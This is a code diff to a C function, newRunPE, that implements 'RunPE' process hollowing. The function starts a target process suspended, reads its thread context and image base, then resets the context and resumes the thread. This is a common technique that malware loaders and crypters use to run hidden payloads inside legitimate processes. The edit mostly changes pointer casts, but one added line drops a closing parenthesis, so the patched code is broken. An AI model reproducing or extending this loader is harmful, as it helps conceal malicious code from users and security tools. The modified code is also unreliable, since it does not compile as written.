@@ -361,7 +361,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 	PIMAGE_SECTION_HEADER ISH;			// Section Header
 	PROCESS_INFORMATION PI;    			// Process Information
 	STARTUPINFOA SI;           			// Start Up Information
-	PCONTEXT CTX;              			// Context Frame
+	LPCONTEXT CTX;              			// Context Frame
 	PDWORD dwImageBase;        			// Source image base
 	NtUnmapViewOfSection xNtUnmapViewOfSection;
 	LPVOID pImageBase;					// Destination image base
@@ -382,11 +382,11 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 		
 				// Create new instance of target process		
 				if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
-					CTX = (PCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+					CTX = (LPCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
 					CTX->ContextFlags = CONTEXT_FULL;
 					
 					// Get image base of target process
-					if (GetThreadContext(PI.hThread, (LPCONTEXT) CTX)) {
+					if (GetThreadContext(PI.hThread, CTX) {
 						#ifndef X64
 							ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + 8), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
 						#endif
@@ -430,7 +430,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
 							#endif
 													
 							// Set target thread context and resume main thread
-							SetThreadContext(PI.hThread, (LPCONTEXT)(CTX));
+							SetThreadContext(PI.hThread, CTX);
 							ResumeThread(PI.hThread);							
 						}
 					}
